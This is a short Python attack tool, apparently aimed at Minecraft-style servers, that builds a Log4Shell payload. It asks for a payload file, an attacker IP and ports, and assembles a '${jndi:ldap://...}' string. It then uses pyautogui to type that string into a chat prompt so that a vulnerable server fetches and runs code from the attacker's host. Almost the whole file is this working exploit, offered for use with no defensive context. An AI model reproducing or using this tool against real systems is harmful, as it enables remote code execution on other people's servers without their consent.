import time
import os
import pyautogui
print((("""
     ...                                                                                          ..       .. 
  .zf"` `"tu                                   xeee           .         .uef^"               x .d88"  x .d88"  
 x88      '8N.        u.                      d888R           E       :d88E                   5888R    5888R   
 888k     d88&  ...ue888b       uL           d8888R        .x+E:..    `888E            .u     '888R    '888R   
 8888N.  @888F  888R Y888r  .ue888Nc..      @ 8888R      u8~  E  `b.   888E .z8k    ud8888.    888R     888R   
 `88888 9888%   888R I888> d88E`"888E`    .P  8888R     t8E   E d888>  888E~?888L :888'8888.   888R     888R   
   %888 "88F    888R I888> 888E  888E    :F   8888R     88N.  E'8888~  888E  888E d888 '88%"   888R     888R   
    8"   "*h=~  888R I888> 888E  888E   x"    8888R     88888b&.`""`   888E  888E 8888.+"      888R     888R   
  z8Weu        u8888cJ888  888E  888E  d8eeeee88888eer  '88888888e.    888E  888E 8888L        888R     888R   
 ""88888i.   Z  "*888*P"   888& .888E         8888R       "*8888888N   888E  888E '8888c. .+  .888B .  .888B . 
"   "8888888*     'Y"      *888" 888&         8888R      uu. ^8*8888E m888N= 888>  "88888%    ^*888%   ^*888%  
      ^"**""                `"   "888E     "*%%%%%%**~  @888L E `"88E  `Y"   888     "YP'       "%       "%    
                           .dWi   `88E                 '8888~ E   98~       J88"                               
                           4888~  J8%                   `*.   E  .*"        @%                                 
                            ^"===*"`                      `~==R=~`        :"        by TheUnsocialEngineer                
""")))

start=input("press 1 to start or 2 to exit:")
payload=()
if start=="1":
    payselec=input("would you like to create a payload or use an existing one? n/e:")
    os.chdir("payloads")
    if payselec=="n":
             filename=input("enter payload file name:")
             filecont=input("enter payload here:")
             f = open(filename, "w")
             f.write(filecont)
             f.close()
             payload=(filename)
             print("payload created.... continuing")
             os.chdir("../")
    else:
        if payselec=="e":
            dir_list = os.listdir(os.getcwd())
            print(dir_list)
            choice=input("choose payload:")
            payload=(choice)
            print(f"you have chosen {choice}.... continuing")
             
    connectip=input("enter your ip:")
    connectport=input("enter connecting port:")
    httport=input("enter the port to host the payload on:")
    payloadstring=str(connectip+":"+connectport+"/"+payload)
    completedpayload=("${jndi:ldap://"+payloadstring+"}")
    print(f"your payload is {completedpayload}")
    time.sleep(5)
    pyautogui.press("/")
    pyautogui.press("backspace")
    pyautogui.write(completedpayload)
    pyautogui.press("enter")
    
    
             
        
  



